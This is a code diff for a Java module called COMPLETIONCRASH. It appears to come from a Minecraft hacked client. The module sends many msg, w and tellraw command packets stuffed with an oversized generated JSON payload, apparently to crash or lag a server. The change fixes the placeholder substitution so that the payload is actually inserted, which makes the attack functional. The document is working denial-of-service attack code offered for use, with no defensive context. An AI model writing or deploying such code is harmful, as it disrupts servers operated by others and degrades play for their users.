@@ -52,7 +52,7 @@ public class COMPLETIONCRASH extends Module {
             case MSG -> {
                 String overflow = generateJsonObject(length);
                 String message = "msg PAYLOAD PAYLOAD";
-                String partialCommand = message.replace("{PAYLOAD}", overflow);
+                String partialCommand = message.replace("PAYLOAD", overflow);
                 for (int i = 0; i < packets.get(); i++) {
                     MinecraftClient.getInstance().player.networkHandler.sendPacket(new CommandExecutionC2SPacket(partialCommand));
                 }
@@ -60,7 +60,7 @@ public class COMPLETIONCRASH extends Module {
             case W -> {
                 String overflow = generateJsonObject(length);
                 String message = "w PAYLOAD PAYLOAD";
-                String partialCommand = message.replace("{PAYLOAD}", overflow);
+                String partialCommand = message.replace("PAYLOAD", overflow);
                 for (int i = 0; i < packets.get(); i++) {
                     MinecraftClient.getInstance().player.networkHandler.sendPacket(new CommandExecutionC2SPacket(partialCommand));
                 }
@@ -68,7 +68,7 @@ public class COMPLETIONCRASH extends Module {
             case TELLRAW -> {
                 String overflow = generateJsonObject(length);
                 String message = "tellraw PAYLOAD \"PAYLOAD\"";
-                String partialCommand = message.replace("{PAYLOAD}", overflow);
+                String partialCommand = message.replace("PAYLOAD", overflow);
                 for (int i = 0; i < packets.get(); i++) {
                     MinecraftClient.getInstance().player.networkHandler.sendPacket(new CommandExecutionC2SPacket(partialCommand));
                 }
